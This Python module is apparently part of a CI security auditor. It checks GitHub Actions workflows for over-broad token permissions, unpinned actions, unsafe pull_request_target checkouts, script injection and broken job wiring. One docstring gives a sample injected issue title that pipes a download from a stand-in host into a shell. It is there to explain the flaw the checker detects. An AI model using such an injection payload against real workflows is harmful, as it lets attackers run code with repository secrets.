"""GitHub Actions adapter.

Implements the adapter contract in core/scripts/audit.py for `.github/workflows/*.yml`:
least-privilege GITHUB_TOKEN permissions, action SHA pinning, untrusted-input safety
(pull_request_target, script injection), and job wiring. Platform-agnostic artefacts
(Dockerfile, Helm chart, ignore files) are checked once by core/scripts/checks_common.py.

Closing a real gap: the standalone GitHub engine checked workflows ONLY, so a repo with a
Dockerfile and a Helm chart had neither audited. Under the unified harness both are
covered automatically, because the common checks run regardless of platform.
"""

from __future__ import annotations

import json
import re
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

import yaml

from checks_common import Finding

NAME = "github"
CI_FILES = [".github/workflows"]
_MAP = Path(__file__).resolve().parent / "workflow-map.json"


def _map() -> Dict[str, Any]:
    with open(_MAP, encoding="utf-8") as fh:
        return json.load(fh)


def workflows_for_shape(shape: str) -> List[str]:
    """Scenario files this shape should contain (see workflow-map.json `shapes`)."""
    return list(_map()["shapes"].get(shape, {}).get("scenarios", []))


def purpose(scenario: str) -> str:
    return _map()["scenarios"].get(scenario, {}).get("purpose", "")


SHA_PIN = re.compile(r"^[0-9a-f]{40}$")


UNTRUSTED_CONTEXTS = re.compile(
    r"github\.event\.(issue\.title|issue\.body|pull_request\.title|pull_request\.body|"
    r"comment\.body|review\.body|review_comment\.body|discussion\.title|discussion\.body|"
    r"head_commit\.message|head_commit\.author\.(name|email)|"
    r"pull_request\.head\.(ref|label|repo\.default_branch))|"
    r"github\.head_ref"
)


WRITE_PERMS = {"write", "write-all"}


def _load(path: Path) -> Optional[Dict[str, Any]]:
    try:
        data = yaml.safe_load(path.read_text(encoding="utf-8", errors="replace"))
        return data if isinstance(data, dict) else None
    except Exception:
        return None


def _on_triggers(wf: Dict[str, Any]) -> Dict[str, Any]:
    """Normalise the `on:` key.

    PyYAML parses a bare `on:` as the BOOLEAN True (YAML 1.1 treats on/off/yes/no as
    booleans), so the key is almost never the string "on". Missing this silently
    disables every trigger-dependent check.
    """
    for key in ("on", True, "true"):
        if key in wf:
            val = wf[key]
            if isinstance(val, dict):
                return val
            if isinstance(val, str):
                return {val: None}
            if isinstance(val, list):
                return {k: None for k in val}
    return {}


def _jobs(wf: Dict[str, Any]) -> Dict[str, Dict[str, Any]]:
    jobs = wf.get("jobs")
    return {k: v for k, v in jobs.items() if isinstance(v, dict)} if isinstance(jobs, dict) else {}


def check_permissions(wf: Dict[str, Any], rel: str) -> List[Finding]:
    """GITHUB_TOKEN least privilege -- the single highest-value structural check.

    With no `permissions:` block the workflow inherits the repository default. On
    repositories created before Feb 2023, or where the org default was never tightened,
    that default is read/write on every scope: a compromised dependency in a test step
    can push to the default branch.
    """
    out: List[Finding] = []
    top = wf.get("permissions")

    if top is None:
        out.append(Finding(
            "P1", "Missing permissions", f"{rel}:permissions",
            "No workflow-level `permissions:` block. The workflow inherits the repository "
            "default, which may be write-all. Declare `permissions: {contents: read}` at the "
            "top and elevate per-job only where needed."))
    elif top == "write-all":
        out.append(Finding(
            "P0", "Write-all token", f"{rel}:permissions",
            "`permissions: write-all` grants every scope to every job. Replace with the "
            "minimum set; elevate per-job."))
    elif isinstance(top, dict):
        broad = [k for k, v in top.items() if isinstance(v, str) and v in WRITE_PERMS]
        if len(broad) >= 3:
            out.append(Finding(
                "P1", "Broad token scope", f"{rel}:permissions",
                f"Workflow-level token grants write on {sorted(broad)}. Keep the workflow "
                f"level read-only and elevate inside the specific job that needs each scope."))

    for name, job in _jobs(wf).items():
        jp = job.get("permissions")
        if jp == "write-all":
            out.append(Finding(
                "P0", "Write-all token", f"{rel}:jobs.{name}.permissions",
                f"Job '{name}' requests `write-all`. Name the specific scopes instead."))
    return out


_VERSION_TAG = re.compile(r"^v?\d+(?:\.\d+)*(?:[-+][0-9A-Za-z.-]+)?$")


def check_action_pinning(wf: Dict[str, Any], rel: str) -> List[Finding]:
    """An action is referenced by a version tag or a commit SHA. Nothing else.

    A tag states a version; a SHA states an exact tree. A branch or a floating alias
    states neither, and runs whatever is on it at the moment the job starts.
    """
    out: List[Finding] = []
    for job_name, job in _jobs(wf).items():
        steps = job.get("steps")
        if not isinstance(steps, list):
            continue
        for idx, step in enumerate(steps):
            if not isinstance(step, dict):
                continue
            uses = step.get("uses")
            if not isinstance(uses, str) or uses.startswith("./") or uses.startswith("docker://"):
                continue
            if "@" not in uses:
                out.append(Finding(
                    "P1", "Unpinned action", f"{rel}:jobs.{job_name}.steps[{idx}]",
                    f"`uses: {uses}` has no ref at all."))
                continue
            repo, ref = uses.rsplit("@", 1)
            if SHA_PIN.match(ref) or _VERSION_TAG.match(ref):
                continue
            severity = "P1"
            note = (" Pin to a full commit SHA with the version in a trailing comment, "
                    "or reference a release tag.")
            if ref in ("main", "master", "HEAD"):
                severity = "P0"
                note = (" A branch ref executes whatever is on that branch at run time. "
                        "Pin to a full commit SHA.")
            out.append(Finding(
                severity, "Unpinned action", f"{rel}:jobs.{job_name}.steps[{idx}]",
                f"`{repo}@{ref}` is neither a release tag nor a commit SHA, so it names "
                f"whatever that ref points at when the job starts -- which the author can "
                f"move to new code that then runs with your GITHUB_TOKEN.{note}"))
    return out


def library_refs(parsed: Dict[str, Any]) -> Dict[str, str]:
    """{library repo name: ref} for every reusable workflow the repo calls.

    A library module is invoked with a JOB-level `uses:`, which check_action_pinning
    never looks at -- it walks steps. Without this the run cannot tell which version of
    the library the consumer is actually on, and so cannot work out what it owes.
    """
    found: Dict[str, str] = {}
    for wf in parsed.values():
        jobs = wf.get("jobs") if isinstance(wf, dict) else None
        if not isinstance(jobs, dict):
            continue
        for job in jobs.values():
            uses = job.get("uses") if isinstance(job, dict) else None
            if not isinstance(uses, str) or "@" not in uses or "/.github/workflows/" not in uses:
                continue
            path, _, ref = uses.rpartition("@")
            parts = path.split("/")
            if len(parts) >= 2 and ref:
                found.setdefault(parts[1], ref)
    return found


def check_untrusted_checkout(wf: Dict[str, Any], rel: str) -> List[Finding]:
    """`pull_request_target` combined with checking out the PR head.

    pull_request_target runs in the context of the BASE repo: it has the repository's
    secrets and a write-capable token. Checking out the fork's code and then running it
    (build, test, install) hands those credentials to an arbitrary contributor. This is
    the single most exploited GitHub Actions misconfiguration.
    """
    out: List[Finding] = []
    triggers = _on_triggers(wf)
    if "pull_request_target" not in triggers:
        return out

    for job_name, job in _jobs(wf).items():
        steps = job.get("steps") if isinstance(job.get("steps"), list) else []
        checks_out_head = False
        for step in steps:
            if not isinstance(step, dict):
                continue
            if isinstance(step.get("uses"), str) and step["uses"].startswith("actions/checkout"):
                ref = str((step.get("with") or {}).get("ref", ""))
                if "head" in ref.lower() or "github.event.pull_request" in ref:
                    checks_out_head = True
        if checks_out_head:
            out.append(Finding(
                "P0", "Untrusted code execution", f"{rel}:jobs.{job_name}",
                "`pull_request_target` checks out the pull-request HEAD. This job holds the "
                "base repository's secrets and a write token while running code from an "
                "arbitrary fork. Use `pull_request` instead, or keep pull_request_target "
                "without ever checking out or executing fork code."))
        elif steps:
            out.append(Finding(
                "P2", "Elevated trigger", f"{rel}:jobs.{job_name}",
                "`pull_request_target` grants secrets and a write token. Confirm no step "
                "executes fork-controlled code (including `npm install` on a fork lockfile)."))
    return out


def check_script_injection(wf: Dict[str, Any], rel: str) -> List[Finding]:
    """Attacker-controlled context interpolated straight into a shell.

    `run: echo "${{ github.event.issue.title }}"` is textual substitution before the shell
    runs, so a title of `"; curl evil.sh | sh; #` executes. The fix is to pass the value
    through `env:` and reference it as a shell variable, which never re-enters the parser.
    """
    out: List[Finding] = []
    for job_name, job in _jobs(wf).items():
        steps = job.get("steps") if isinstance(job.get("steps"), list) else []
        for idx, step in enumerate(steps):
            if not isinstance(step, dict):
                continue
            run = step.get("run")
            if not isinstance(run, str):
                continue
            for m in set(UNTRUSTED_CONTEXTS.findall(run)):
                token = m if isinstance(m, str) else next(x for x in m if x)
                out.append(Finding(
                    "P0", "Script injection", f"{rel}:jobs.{job_name}.steps[{idx}].run",
                    f"Attacker-controlled context interpolated into a shell command "
                    f"(matched '{token}'). Assign it to an `env:` variable on the step and "
                    f"reference it as \"$VAR\" so the value is never re-parsed as script."))
    return out


def check_job_wiring(wf: Dict[str, Any], rel: str) -> List[Finding]:
    """`needs:` correctness and concurrency hygiene."""
    out: List[Finding] = []
    jobs = _jobs(wf)
    names = set(jobs)

    for job_name, job in jobs.items():
        needs = job.get("needs")
        needs_list = [needs] if isinstance(needs, str) else (needs or [])
        for dep in needs_list:
            if isinstance(dep, str) and dep not in names:
                out.append(Finding(
                    "P0", "Broken needs", f"{rel}:jobs.{job_name}.needs",
                    f"Job '{job_name}' needs '{dep}', which is not defined in this workflow. "
                    f"The workflow will fail to start."))

        # A cleanup/teardown job that does not force `if: always()` is skipped exactly
        # when it is needed -- after the job it cleans up has failed.
        if needs_list and re.search(r"(cleanup|teardown|destroy|rollback)", job_name, re.I):
            cond = str(job.get("if", ""))
            if "always()" not in cond and "failure()" not in cond and "cancelled()" not in cond:
                out.append(Finding(
                    "P1", "Cleanup never runs", f"{rel}:jobs.{job_name}",
                    f"Job '{job_name}' looks like cleanup but has no `if: always()` / "
                    f"`if: failure()`. A needed job that fails skips this one, leaking "
                    f"whatever it was meant to tear down."))

    # Any workflow that starts itself needs a group, not just a PR one: two manual runs,
    # or a schedule landing on top of one, race the same caches and registry tags. A
    # `workflow_call`-only workflow is exempt -- the caller's group already covers it.
    triggers = _on_triggers(wf)
    self_starting = [t for t in triggers if t != "workflow_call"]
    if self_starting and "concurrency" not in wf:
        out.append(Finding(
            "P2", "No concurrency group", f"{rel}:concurrency",
            f"No `concurrency:` block on a workflow triggered by {', '.join(sorted(self_starting))}. "
            "Two runs of it proceed in parallel, racing the same caches and registry tags. Add a "
            "group keyed on the ref. `cancel-in-progress: true` for verification; false where a "
            "run publishes or provisions and must finish."))

    return out


def check_shape(repo: Path, present: List[str], shape: Optional[str]) -> List[Finding]:
    """Declared workflow files vs the shape the repository actually is."""
    out: List[Finding] = []
    if not shape:
        return out
    expected = set(workflows_for_shape(shape))
    have = set(present)
    for missing in sorted(expected - have):
        out.append(Finding("P2", "Missing workflow", ".github/workflows",
                           f"Shape '{shape}' normally has {missing} ({purpose(missing)}), "
                           f"which is absent."))
    catalog = set(_map()["scenarios"])
    for extra in sorted((have & catalog) - expected):
        out.append(Finding("P2", "Unneeded workflow", f".github/workflows/{extra}",
                           f"{extra} does not apply to shape '{shape}'. It adds scheduling cost "
                           f"and a token-bearing surface for work this repository cannot do."))
    return out


def ci_checks(repo: Path, shape: Optional[str] = None) -> Tuple[List[Finding], Dict[str, Any]]:
    """Adapter entry point. Returns (findings, {workflow name: parsed doc})."""
    findings: List[Finding] = []
    wf_dir = repo / ".github" / "workflows"
    parsed: Dict[str, Any] = {}

    if not wf_dir.is_dir():
        findings.append(Finding("P0", "No workflows", ".github/workflows",
                                "Directory does not exist; the repository has no CI."))
        return findings, parsed

    files = sorted(p for p in wf_dir.iterdir() if p.suffix in (".yml", ".yaml") and p.is_file())
    for path in files:
        rel = f".github/workflows/{path.name}"
        wf = _load(path)
        if wf is None:
            findings.append(Finding("P0", "Unparseable workflow", rel,
                                    "File is not valid YAML or is not a mapping."))
            continue
        parsed[path.name] = wf
        if not _jobs(wf):
            findings.append(Finding("P1", "No jobs", rel, "Workflow defines no jobs."))
        if not _on_triggers(wf):
            findings.append(Finding("P0", "No triggers", f"{rel}:on",
                                    "Workflow declares no `on:` triggers and can never run."))
        findings += check_permissions(wf, rel)
        findings += check_action_pinning(wf, rel)
        findings += check_untrusted_checkout(wf, rel)
        findings += check_script_injection(wf, rel)
        findings += check_job_wiring(wf, rel)

    findings += check_shape(repo, [p.name for p in files], shape)
    return findings, parsed
